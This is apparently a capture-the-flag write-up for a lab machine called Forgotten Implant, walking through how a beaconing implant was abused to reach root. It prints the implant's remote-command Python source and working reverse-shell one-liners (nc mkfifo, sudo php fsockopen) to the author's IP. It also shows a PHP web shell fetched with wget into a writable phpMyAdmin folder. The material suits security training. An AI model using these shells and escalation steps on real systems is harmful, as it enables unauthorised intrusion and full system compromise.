# Forgotten Implant

# Enumeration

nmap shows all ports closed. even intensive scans

```bash
┌──(user㉿kali-linux-2022-2)-[~]
└─$ nmap 10.10.115.84
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-02 17:08 EDT
Nmap scan report for 10.10.115.84
Host is up (0.089s latency).
All 1000 scanned ports on 10.10.115.84 are in ignored states.
Not shown: 1000 closed tcp ports (conn-refused)

Nmap done: 1 IP address (1 host up) scanned in 1.72 seconds
```

Hint is that this is an implant, so it should be calling us not listening.

We run Wireshark and listen on our VPN at `tun0` and kill any leftover nmap sessions to limit the noise from the rest of the network. We see that the machine is trying to call us on port 81. It must know our IP due to the port scan we ran…

![Untitled](Untitled.png)

Let’s run a netcat listener to give it something to connect to:

```bash
──(user㉿kali-linux-2022-2)-[~]
└─$ nc -lvp 81
listening on [any] 81 ...
10.10.115.84: inverse host lookup failed: Unknown host
connect to [10.6.74.177] from (UNKNOWN) [10.10.115.84] 43784
GET /heartbeat/eyJ0aW1lIjogIjIwMjMtMDgtMDJUMjE6MTI6MDIuMDg5NDc3IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1
Host: 10.6.74.177:81
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

decode the b64

```json
{"time": "2023-08-02T21:12:02.089477", "systeminfo": {"os": "Linux", "hostname": "forgottenimplant"}, "latest_jo_id": 0, "cmd": "whoami"}, "success": false}
```

http. so we need a server

```bash
┌──(user㉿kali-linux-2022-2)-[~]
└─$ python -m http.server 81
Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
10.10.115.84 - - [02/Aug/2023 17:16:02] code 404, message File not found
10.10.115.84 - - [02/Aug/2023 17:16:02] "GET /heartbeat/eyJ0aW1lIjogIjIwMjMtMDgtMDJUMjE6MTY6MDEuNzk2NjQ5IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1" 404 -
10.10.115.84 - - [02/Aug/2023 17:16:03] code 404, message File not found
10.10.115.84 - - [02/Aug/2023 17:16:03] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 404 -
10.10.115.84 - - [02/Aug/2023 17:17:01] code 404, message File not found
10.10.115.84 - - [02/Aug/2023 17:17:01] "GET /heartbeat/eyJ0aW1lIjogIjIwMjMtMDgtMDJUMjE6MTc6MDEuNjUwODk3IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1" 404 -                                            
10.10.115.84 - - [02/Aug/2023 17:17:03] code 404, message File not found                                        
10.10.115.84 - - [02/Aug/2023 17:17:03] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 404 -
```

We see calls coming in for heartbeat and get-job. 

# Foothold

Host a file at `/get-job/ImxhdGVzdCI=` to send jobs. 

```bash
┌──(user㉿kali-linux-2022-2)-[~]
└─$ mkdir get-job

┌──(user㉿kali-linux-2022-2)-[~]
└─$ echo 'ls' > get-job/ImxhdGVzdCI=
```

```bash
10.10.115.84 - - [02/Aug/2023 17:31:02] "GET /job-result/eyJzdWNjZXNzIjogZmFsc2UsICJyZXN1bHQiOiAiRW5jb2RpbmcgZXJyb3IifQ==
```

now we get `{"success": false, "result": "Encoding error"}`

OK, so it wants b64

`echo 'ls' | base64 > get-job/ImxhdGVzdCI=`

`{"success": false, "result": "JSON error"}`

Let’s try the JSON format we received in the heartbeat message. Submitting

`echo '{"job_id": 0, "cmd": "ls"}' | base64 > get-job/ImxhdGVzdCI=`

returns

`{"job_id": 0, "cmd": "ls", "success": true, "result": "[products.py](http://products.py/)\nuser.txt\n"}`

lets grab that flag right now!

`echo '{"job_id": 0, "cmd": "cat user.txt"}' | base64 > get-job/ImxhdGVzdCI=`

`{"job_id": 0, "cmd": "cat user.txt", "success": true, "result": "THM{[redacted]}\n"}`

# Initial Shell

Some of the more popular shells don’t seem to work on this box but eventualll we find one that does.  

```json
{"job_id": 0, "cmd": "127.0.0.1 && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.74.177 4444 >/tmp/f"}
```

`python3 -c 'import pty;pty.spawn("/bin/bash");'`

There is a Python script in our home directory. 

```python
import mysql.connector

db = mysql.connector.connect(
    host='localhost', 
    database='app', 
    user='app', 
    password='[redacted]'
    )

cursor = db.cursor()
cursor.execute('SELECT * FROM products')

for product in cursor.fetchall():
    print(f'We have {product[2]}x {product[1]}')
```

We enumerate the database locally using the credentuals here but find nothing interesting. 

We also have a hidden directory `.implant` off of our home. 

```python
import base64
import binascii
import json
import platform
import subprocess
import time
from datetime import datetime
from pathlib import Path

import requests

def systeminfo():
    return {
        'os': platform.system(),
        'hostname': platform.node(),
    }

class Commander:
    def __init__(self, host, log_dir, port=81):
        self.log_dir = Path(log_dir)
        self.log_file = self.log_dir / f'{host}.log'
        self.port = port
        self.host = host

        try:
            self.log = json.loads(self.log_file.read_text())
        except FileNotFoundError:
            self.log = {'heartbeats': [], 'jobs': [{'job_id': 0, 'cmd': 'whoami'}]}
            self.save_log()

    def encode_message(self, message):
        return base64.b64encode(message.encode('utf-8')).decode('utf-8')

    def decode_message(self, message):
        return base64.b64decode(message).decode('utf-8')
    
    def save_log(self):
        self.log_file.write_text(json.dumps(self.log))

    def send_c2_message(self, endpoint, message):
        try:
            message = self.encode_message(json.dumps(message))
            r = requests.get(f'http://{self.host}:{self.port}/{endpoint}/{message}')

            return r.text
        except requests.exceptions.ConnectionError:
            raise ConnectionError('Could not connect to C2')

    def send_heartbeat(self):
        heartbeat = {
            'time': datetime.now().isoformat(),
            'systeminfo': systeminfo(),
            'latest_job': self.log['jobs'][-1] if len(self.log['jobs']) > 0 else None,
            'success': False
        }

        try:
            self.send_c2_message('heartbeat', heartbeat)

            heartbeat['success'] = True
            self.log['heartbeats'].append(heartbeat)
        except ConnectionError:
            self.log['heartbeats'].append(heartbeat)
            print('Could not send heartbeat')

    def execute_cmd(self, command):
        try:
            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
            output, err = p.communicate()
            return output.decode('utf-8')
        except Exception as e:
            print(e)
            return False

    def get_job(self, job_id='latest'):
        try:
            job = self.send_c2_message('get-job', job_id)
            job = json.loads(self.decode_message(job))
            self.log['jobs'].append(job)

            if 'cmd' in job:
                job['success'] = True
                job['result'] = self.execute_cmd(job['cmd'])
                self.send_c2_message('job-result', job)
            else:
                job['success'] = False
                job['result'] = 'No command'
                self.send_c2_message('job-result', job)
        except ConnectionError:
            print('Could not get job')
        except TypeError:
            print('Job formatting error')
        except json.JSONDecodeError:
            job = {'success': False, 'result': 'JSON error'}
            self.send_c2_message('job-result', job)
            print('JSON error')    
        except binascii.Error:
            job = {'success': False, 'result': 'Encoding error'}
            self.send_c2_message('job-result', job)
            print('Encoding error')
        except Exception as e:
            print(f'Job execution error ({e})')

if __name__ == "__main__":
    log_dir = Path('/home/ada/.implant')
    hosts_file = Path('/home/ada/.implant/hosts')

    if hosts_file.exists():
        hosts = hosts_file.read_text().split('\n')

        commanders = [Commander(host, log_dir) for host in hosts if host != '']

        for commander in commanders:
            commander.send_heartbeat()
            time.sleep(1)
            commander.get_job()
            commander.save_log()

```

In fi’s home directory 

```bash
ada@forgottenimplant:/home/fi$ ls -la

total 148
drwxr-xr-x 6 fi   fi    4096 Apr 29 15:09 .
drwxr-xr-x 4 root root  4096 Jul 12  2022 ..
lrwxrwxrwx 1 fi   fi       9 Jul 10  2022 .bash_history -> /dev/null
-rw-r--r-- 1 fi   fi     220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 fi   fi    3771 Feb 25  2020 .bashrc
drwx------ 3 fi   fi    4096 Jul 12  2022 .cache
drwxrwxr-x 4 fi   fi    4096 Apr 14 15:50 .config
drwxrwxr-x 3 fi   fi    4096 Jul 10  2022 .local
-rw-r--r-- 1 fi   fi     807 Feb 25  2020 .profile
lrwxrwxrwx 1 fi   fi       9 Jul 10  2022 .python_history -> /dev/null
-rwxrwxr-x 1 fi   fi     270 Apr 14 15:52 sanitize.sh
-rw-rw-r-- 1 fi   fi      66 Jul 12  2022 .selected_editor
-rw-r--r-- 1 root root 94981 Aug  2 22:17 sniffer.log
-rwxrwxr-x 1 fi   fi    2106 Apr 29 14:33 sniffer.py
drwx------ 2 fi   fi    4096 Jul 10  2022 .ssh
-rw-r--r-- 1 fi   fi       0 Jul 10  2022 .sudo_as_admin_successful
```

let’s check 

```bash
ada@forgottenimplant:/home/fi$ python3 -c "import sys; print('\n'.join(sys.path))"

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/home/ada/.local/lib/python3.8/site-packages
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

```python
import logging
import time
from pathlib import Path

from scapy.all import *

logging.basicConfig(filename='/home/fi/sniffer.log', level=logging.DEBUG)

class PacketsHosts():
    def __init__(self, DET_TH=10, hosts_file='/home/ada/.implant/hosts'):
        self.DET_TH = DET_TH  # Threshold for an active host
        self.hosts_file = Path(hosts_file)
        self.packets = {}
        self.hosts = []

    def write_hosts(self):
        if len(self.hosts) > 0:
            try:
                self.hosts_file.write_text('\n'.join(self.hosts) + '\n', )
                logging.info(f'Writing hosts: {self.hosts}')
            except FileNotFoundError:
                logging.error(f'{self.hosts_file} not found')
            except Exception as e:
                logging.error(e)
        else:
            logging.debug('Nothing new to write')

    def check_status(self):
        for host, p in self.packets.items():
            if len(p['ports'].keys()) >= self.DET_TH:
                if host[0:3] == '10.':  # Only internal hosts
                    if host not in self.hosts:
                        self.hosts.append(host)
                        logging.info(f'New active internal host detected: {host} (Hosts: {self.hosts})')
                        self.write_hosts()
                else:
                    logging.info(f'New active external host detected: {host} (Hosts: {self.hosts})')

    def tcp_monitor_callback(self, pkt):
        ip = pkt.sprintf("%IP.src%")
        port = pkt.sprintf("%IP.dport%")

        if ip not in self.packets.keys():
            self.packets[ip] = {'packets': 1, 'ports': {}}
        else:
            self.packets[ip]['packets'] += 1

        if port not in self.packets[ip]['ports'].keys():
            self.packets[ip]['ports'][port] = 1
        else:
            self.packets[ip]['ports'][port] += 1

        self.check_status()

if __name__ == "__main__":
    packets_hosts = PacketsHosts()
    sniff(prn=packets_hosts.tcp_monitor_callback, filter="tcp and inbound and not port 22", store=0)
```

We seem to have run out of likely paths to become fi, let’s look for another path.

# Become www-data

In most challenges we’re trying to elevate OUT of the www-data account, lets look for an easy way in.

Running `curl 127.0.0.1` indicates that we are serving phpMyAdmin on port 80, and enumerating that directory locally we see we can write to the `tmp` folder.

```bash
cd phpmyadmin/
ada@forgottenimplant:/var/www/phpmyadmin$ ls -la

total 908
drwxrwxr-x 15     1002     1002   4096 Jul 12  2022 .
drwxr-xr-x  4 root     root       4096 Jul 12  2022 ..
-rw-rw-r--  1 www-data www-data   1578 May 25  2018 ajax.php

[...]

drwxrwxr-x 19 www-data www-data   4096 May 25  2018 templates
drwxrwxr-x  6 www-data www-data   4096 May 25  2018 test
drwxrwxr-x  4 www-data www-data   4096 May 25  2018 themes
-rw-rw-r--  1 www-data www-data    956 May 25  2018 themes.php
drwxrwxrwx  3 www-data www-data   4096 Jul 12  2022 tmp
-rw-rw-r--  1 www-data www-data   1910 May 25  2018 transformation_overview.php
-rw-rw-r--  1 www-data www-data   4617 May 25  2018 transformation_wrapper.php
-rw-rw-r--  1 www-data www-data   1316 May 25  2018 url.php
-rw-rw-r--  1 www-data www-data   1943 May 25  2018 user_password.php
drwxr-xr-x 25 www-data www-data   4096 Jul 12  2022 vendor
-rw-rw-r--  1 www-data www-data   1085 May 25  2018 version_check.php
-rw-rw-r--  1 www-data www-data   5531 May 25  2018 view_create.php
-rw-rw-r--  1 www-data www-data   3875 May 25  2018 view_operations.php
-rw-rw-r--  1 www-data www-data  29031 May 25  2018 yarn.lock
ada@forgottenimplant:/var/www/phpmyadmin$
```

A quick test to prove that the folder is accessable:

```bash
ada@forgottenimplant:/var/www/phpmyadmin$ echo "hello" > tmp/hi.html

ada@forgottenimplant:/var/www/phpmyadmin$ curl 127.0.0.1/tmp/hi.html

hello
```

Looks good. Let’s upload a PHP shell and trigger it with curl:

```bash
ada@forgottenimplant:/var/www/phpmyadmin/tmp$ wget 10.6.74.177/shell.php

--2023-08-02 22:32:12--  http://10.6.74.177/shell.php
Connecting to 10.6.74.177:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5493 (5.4K) [application/octet-stream]
Saving to: ‘shell.php’

shell.php           100%[===================>]   5.36K  --.-KB/s    in 0.001s  

2023-08-02 22:32:12 (4.64 MB/s) - ‘shell.php’ saved [5493/5493]

ada@forgottenimplant:/var/www/phpmyadmin/tmp$ curl 127.0.0.1/tmp/shell.php
```

With the above we receive a connection back in our new shell as www-data

# Become root

```bash
$ sudo -l
Matching Defaults entries for www-data on forgottenimplant:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on forgottenimplant:
    (root) NOPASSWD: /usr/bin/php
```

To leverage this, we’ll start one more listener on an empty port, then make a call back via PHP with `sudo` : 

```bash
www-data@forgottenimplant:/$ sudo php -r '$sock=fsockopen("10.6.74.177",4447);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Finally we see that beautiful hashtag prompt!

```bash
┌──(user㉿kali-linux-2022-2)-[~]
└─$ nc -lvp 4447
listening on [any] 4447 ...
10.10.115.84: inverse host lookup failed: Unknown host
connect to [10.6.74.177] from (UNKNOWN) [10.10.115.84] 60730
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
#
```